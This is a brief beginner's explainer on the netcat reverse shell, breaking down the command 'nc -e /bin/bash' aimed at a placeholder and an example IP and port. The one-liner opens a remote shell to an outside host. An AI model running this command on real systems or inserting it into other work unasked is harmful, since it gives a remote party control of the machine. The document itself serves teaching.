# Reverse Shell

```
nc -e /bin/bash IP_ADDRESS PORT_NUMBER
nc -e /bin/bash 190.190.190.190 1234
```

1. `nc`: This is a command called "netcat." It's like a messenger that helps computers talk to each other over a network.

2. `-e /bin/bash`: These are options or flags for netcat, and they provide special instructions. Let's break them down:
   1. `-e`: This option means "execute." It's like saying, "Hey netcat, after you connect, execute the following command."
   2. `/bin/bash`: This is the command that netcat will execute. In simple terms, it's like saying, "Start a new conversation using the 'bash' program, which is like a language that computers understand."

3. `190.190.190.190`: This is an IP address, like the home address of the computer we want to talk to. It's like saying, "I want to talk to the computer living at this address."

4. `1234`: This is the port number, and it's like the door number where netcat will try to connect. It's like saying, "Lets knock on the door with number 1234 and start our converstaion."

## So, if we put it all together:

The command `nc -e /bin/bash 190.190.190.190 1234` is like saying, "Hey netcat, go to the computer at the address 190.190.190.190, knock on the door with the number 1234, and when they answer, start a conversation using the 'bash' language."

In a more real-world scenario, this command might be used for a purpose called a reverse shell, where one computer connects back to another to establish a conversation. Always remember to use such commands responsibly and with proper authorization!
